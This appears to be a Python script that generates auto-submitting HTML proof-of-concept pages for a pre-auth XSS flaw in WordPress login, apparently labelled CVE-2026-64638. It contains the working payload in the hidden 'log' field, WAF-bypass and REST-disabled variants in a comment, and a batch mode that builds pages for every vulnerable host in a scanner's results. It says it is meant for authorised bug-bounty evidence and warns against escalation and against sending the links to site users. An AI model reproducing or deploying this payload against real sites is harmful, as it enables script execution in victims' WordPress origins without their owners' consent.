#!/usr/bin/env python3
"""
make_poc.py - generate the *published* pre-auth XSS PoC page for
CVE-2026-64638 (XSS2Shell), for authorized bug-bounty evidence only.

What this is:
  The verbatim PoC page that pwn.ai published in their disclosure
  (https://pwn.ai/blog/xss2shell): a form that fires ONE failed login at
  <target>/wp-login.php. On an unpatched WordPress the strip_tags/KSES
  mismatch reflects the marker DOM, user-profile.js auto-fires it, and the
  REST JSONP wrapper ends in alert() executing *in the WordPress origin*
  in the CURRENT visitor's browser.

What this is NOT (intentionally not included):
  No weaponized JSONP callbacks beyond the public alert(), no admin-lure
  pages, no Application-Password capture, no REST abuse, no plugin upload,
  no shell. Escalating to RCE on a real target belongs only in a program-
  approved, coordinated setting - it is not something this toolkit provides.

Correct evidence workflow (industry standard for XSS bounties):
  1. Host the generated file on YOUR OWN server (or open it locally).
  2. Open it in YOUR OWN browser (fresh profile), while recording video.
  3. The alert firing proves pre-auth script execution in the site origin.
  4. Screenshot + video + payload string + scanner CSV row go into the report.
  5. NEVER send the link to the site's admins/users and never escalate past
     the alert without the program's written approval.

Usage:
  python3 make_poc.py --target https://example.com           # single target
  python3 make_poc.py --from-results out.csv -o pocs/    # batch: all
                                                     # vulnerable/likely_vulnerable rows
"""
import argparse
import csv
import os
import re
import sys

TEMPLATE = """<!doctype html>
<!--
  CVE-2026-64638 (XSS2Shell) - pre-auth XSS evidence PoC
  Target : {target}
  Source : verbatim payload published in pwn.ai's disclosure
  USE    : open hosted on YOUR server in YOUR browser while recording;
           alert() firing = pre-auth JS execution in the WordPress origin.
           Do NOT send this link to site admins/users. Do NOT escalate.
-->
<html lang="en">
<head><meta charset="utf-8"><title>CVE-2026-64638 PoC - {host}</title>
<style>body{{font-family:monospace;background:#111;color:#eee;max-width:720px;margin:3rem auto;padding:0 1rem}}
code{{color:#7fd1ff}}</style></head>
<body>
<h3>CVE-2026-64638 pre-auth XSS PoC<br><small>target: {target}</small></h3>
<p>Auto-submitting one failed login in 3 seconds. On an unpatched WordPress,
an <code>alert()</code> containing the site's own REST index JSON (site name /
URL) fires - proof of script execution in the WordPress origin.</p>

<form id="poc" method="post" action="{target}/wp-login.php">
  <input type="hidden" name="log"
    value='< area id=ajaxurl href=/?rest_route=/&amp;_method=GET&amp;_jsonp=alert>< div id=color-picker class=reset-pass-submit>< button class="wp-generate-pw color-option">X'>
  <input type="hidden" name="pwd" value="x">
</form>

<!--
 Variants documented in the disclosure (swap the href value above if needed):
 * 401/REST-disabled sites:      /?rest_route=/&_method=GET&_envelope=1&_jsonp=alert
 * WAF blocks ?rest_route=:      /wp-json/wp/v2/statuses/publish?_jsonp=alert&_method=GET
 The space after each '<' is the exploit primitive - removing it neutralizes the PoC.
-->

<p id="st">submitting...</p>
<script>setTimeout(function(){{document.getElementById('poc').submit();}},3000);</script>
</body></html>
"""


def norm(target: str) -> str:
    target = target.strip().rstrip("/")
    if "://" not in target:
        target = "https://" + target
    if not re.match(r'^https?://[\w.-]+(?::\d+)?$', target):
        raise ValueError(f"target must be a bare origin, got: {target!r}")
    return target


def write(target: str, outdir: str) -> str:
    host = target.split("://", 1)[1]
    os.makedirs(outdir, exist_ok=True)
    path = os.path.join(outdir, re.sub(r'[^\w.-]', '_', host) + ".poc.html")
    with open(path, "w") as fh:
        fh.write(TEMPLATE.format(target=target, host=host))
    return path


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", help="single origin, e.g. https://blog.example.com")
    ap.add_argument("--from-results",
                    help="scanner results.csv; generates PoCs for every "
                         "vulnerable / likely_vulnerable row")
    ap.add_argument("-o", "--outdir", default="pocs",
                    help="output directory (default: pocs/)")
    args = ap.parse_args()

    POC_STATUSES = ("confirmed_vulnerable", "vulnerable", "likely_vulnerable")
    targets = []
    if args.target:
        targets.append(norm(args.target))
    if args.from_results:
        with open(args.from_results) as fh:
            for row in csv.DictReader(fh):
                if row.get("status") in POC_STATUSES:
                    targets.append(norm(row.get("url") or row["host"]))
    if not targets:
        ap.error("nothing to do: pass --target and/or --from-results")

    print("authorized-use reminder: evidence capture in YOUR browser only; "
          "no admin-luring, no escalation past alert().\n")
    for i, t in enumerate(dict.fromkeys(targets), 1):
        p = write(t, args.outdir)
        print(f"[{i}] {t:<40} -> {p}")
    print(f"\n[+] done. Host the files on your own server, open in your own "
          f"browser while recording, and attach the video to your report.")


if __name__ == "__main__":
    main()